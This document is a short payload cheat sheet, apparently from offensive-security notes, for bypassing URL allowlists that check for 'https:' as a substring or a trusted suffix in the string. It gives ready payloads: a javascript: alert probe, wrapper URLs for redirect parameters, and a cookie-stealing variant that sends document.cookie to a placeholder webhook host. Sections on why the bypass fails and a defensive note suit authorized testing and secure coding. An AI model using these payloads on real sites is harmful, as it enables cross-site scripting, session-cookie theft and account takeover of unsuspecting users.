# JavaScript URI Suffix Allowlist Bypass

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- a redirector or client-side navigation helper takes a user-controlled URL
- validation checks for `https:` as a substring instead of enforcing the actual scheme
- the allowlist uses `endsWith(".trusted.example")` or a similar suffix check
- the application assigns the accepted value to `location.href`, `location`, or `window.open`

## Minimal Payload

```text
javascript:alert(1)//https:.trusted.example
```

## Same-Origin Wrapper Example

```text
https://[host]/?l=javascript:alert(1)//https:.trusted.example
```

Adjust the parameter name to match the target: `l`, `url`, `to`, `next`, `redirect`, or `return`.

## Cookie Exfil Variant

```text
javascript:fetch('https://[webhook]?c='+encodeURIComponent(document.cookie))//https:.trusted.example
```

Wrapper URL:

```text
https://[host]/?l=javascript:fetch('https://[webhook]?c='+encodeURIComponent(document.cookie))//https:.trusted.example
```

## Why It Works

The payload keeps executable behavior at the front of the string while placing a trusted-looking suffix at the end. Weak validators often see:

```text
contains https:   -> allowed
endsWith suffix   -> allowed
```

but the browser sees:

```text
scheme = javascript:
```

and executes the code.

## Why It Fails

- The app parses with `new URL()` on every path and validates `protocol`.
- The sink explicitly blocks `javascript:` before navigation.
- The allowlist is enforced on `hostname`, not the full string.
- CSP or another browser control blocks the follow-on exfil step even if code runs.

## Common Mistakes

- Testing only `https://trusted.example@attacker` and missing the non-HTTP branch.
- Forgetting that the payload must still end with the trusted suffix.
- Putting the trusted suffix in the middle of the string instead of at the tail.
- Storing live flags, webhook URLs, or cookies in reusable payload files.

## Defensive Note

Trusted suffixes are not a URL security control unless they are applied to a parsed hostname after strict scheme validation.
